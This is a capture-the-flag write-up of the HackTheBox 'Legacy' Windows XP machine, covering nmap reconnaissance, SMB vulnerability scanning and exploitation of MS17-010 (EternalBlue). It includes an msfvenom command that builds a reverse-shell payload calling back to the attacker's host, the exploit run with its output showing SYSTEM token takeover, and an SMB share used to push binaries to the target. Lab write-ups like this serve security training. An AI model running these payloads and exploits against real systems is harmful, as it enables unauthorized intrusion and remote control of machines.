---
title: Legacy
date: 2022-06-11 15:00:34
img: /medias/images/legacy/Legacy.png
author: 0xma
categories:
  - windows
  - hackthebox
tags: 
  - ctf
  - hackthebox
  - htb-legacy
  - windows
  - ms08-067
  - ms17-010
  - smb
  - msfvenom
  - xp
  - oscp-like
---
# [Easy] Legacy

![Untitled](/medias/images/legacy/Untitled.png)

## Reconnaissance

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```bash
sudo nmap -sC -sV -O -oA nmap/initial 10.129.223.133 
                                                                                     1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-05 01:46 EDT
Nmap scan report for legacy.htb (10.129.223.133)
Host is up (0.20s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (88%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows XP SP2 or Windows Server 2003 (91%), Microsoft Windows 2003 SP2 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows 2000 SP4 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h57m38s, deviation: 1h24m50s, median: 4d23h57m38s
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:c9:6e (VMware)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-11-10T09:44:20+02:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.59 seconds
```

- **sC**: run default nmap scripts
- **sV**: detect service version
- **O**: detect OS
- **oA**: output all formats and store in file *nmap/initial*

We get back the following result showing that these ports are open:

- **Port 139:** running Microsoft Windows netbiois-ssn.
- **Port 445:** running Windows XP microsoft-ds.

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

We get back the following result. No other ports are open.

```bash
sudo nmap -sC -sV -O -p- -oA nmap/full 10.129.223.133                                                                                     1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-05 01:49 EDT
Nmap scan report for legacy.htb (10.129.223.133)
Host is up (0.22s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (87%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows XP SP2 or Windows Server 2003 (91%), Microsoft Windows 2003 SP2 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (90%), Microsoft Windows XP SP2 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h57m39s, deviation: 1h24m50s, median: 4d23h57m39s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:c9:6e (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-11-10T09:54:47+02:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 485.76 seconds
```

Similarly, we run an nmap scan with the **sU** flag enabled to run a UDP scan.

We get back the following result. As can be seen, port 137 is open with netbios-ns running on it.

```bash
sudo nmap -sU -O -p- -oA nmap/udp 10.129.223.133
```

Our initial recon shows that the only point of entry is possibly through exploiting SMB.

## Enumeration

SMB has had its fair share of vulnerabilities in the past, so let’s first run nmap scripts to determine if it is vulnerable.

```bash
nmap -v -script smb-vuln* -p 139,445 10.129.223.133
```

The result shows us that it is vulnerable to CVE-2009–3103 and CVE-2017–0143 and likely vulnerable to CVE-2008–4250. The target machine is running SMBv1 so we’ll go with CVE-2017–0143 (MS17–010).

## Exploitation

The vulnerability we’ll be exploiting is called Eternal Blue. This vulnerability exploited Microsoft’s implementation of the Server Message Block (SMB) protocol, where if an attacker sent a specially crafted packet, the attacker would be allowed to execute arbitrary code on the target machine.

I came across this [article](https://ethicalhackingguru.com/how-to-exploit-ms17-010-eternal-blue-without-metasploit/) that explains how to exploit the Eternal Blue vulnerability without
using Metasploit. We’ll use it to run the exploit on the target machine.

First, download the exploit code from Github.

```bash
git clone https://github.com/helviojunior/MS17-010.git
```

Use MSFvenom to create a reverse shell payload (allowed on the OSCP as long as you’re not using meterpreter).

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4242 -f exe > eternalblue.exe
```

Start up a listener on your attack machine.

![Untitled](/medias/images/legacy/Untitled%201.png)

Run the exploit.

```bash
python2 send_and_execute.py 10.129.223.133 /home/kali/Documents/CTF/HackTheBox/Machine/Windows/Easy/Legacy/eternalblue.exe     1 ⨯
Trying to connect to 10.129.223.133:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x821785b0
SESSION: 0xe21a7f58
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe10f2d08
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe10f2da8
overwriting token UserAndGroups
Sending file 9XP3L9.exe...
Opening SVCManager on 10.129.223.133.....
Creating service FPZD.....
Starting service FPZD.....
The NETBIOS connection with the remote host timed out.
Removing service FPZD.....
ServiceExec Error on: 10.129.223.133
nca_s_proto_error
Done
```

We have a reverse shell!

![Untitled](/medias/images/legacy/Untitled%202.png)

Next, we need to figure out what privileges we are running with.

![Untitled](/medias/images/legacy/Untitled%203.png)

**Whoami** doesn’t seem to work and we can’t echo the username. Therefore, we’ll have to get creative. Kali has a **whoami** executable that we can import to our target machine.

![Untitled](/medias/images/legacy/Untitled%204.png)

Both netcat and powershell are not installed on the target machine, so we can’t use them to import the executable. Therefore, let’s try and setup an SMB server for the transfer.

Locate the SMB server script on kali.

![Untitled](/medias/images/legacy/Untitled%205.png)

Run the script to launch an SMB server on port 445 with the share name *temp* and the path to the whoami executable.

```bash
sudo /usr/share/doc/python-impacket/examples/smbserver.py temp /usr/share/windows-binaries/
```

![Untitled](/medias/images/legacy/Untitled%206.png)

Verify that script ran correctly by accessing the SMB share.

```bash
smbclient //10.10.14.14/temp
```

![Untitled](/medias/images/legacy/Untitled%207.png)

<aside>
💡 In last release of Kali there is an issue I encountered too. In order to get `smbclient`to work you need to edit the SMB configuration file. And then at least mine worked.

</aside>

<aside>
💡 I'm using `vi` to I edit the config file as follows:

</aside>

<aside>
💡 vi /etc/samba/smb.conf

</aside>

<aside>
💡 You need to add the following settings under `GLOBAL`:

</aside>

<aside>
💡 client min protocol = CORE
client max protocol = SMB

</aside>

In the target machine, you can now execute the whoami command using the temp share.

```bash
\\10.10.14.14\temp\whoami.exe
```

we already admin, so lets grab user and root

![Untitled](/medias/images/legacy/Untitled%208.png)

![Untitled](/medias/images/legacy/Untitled%209.png)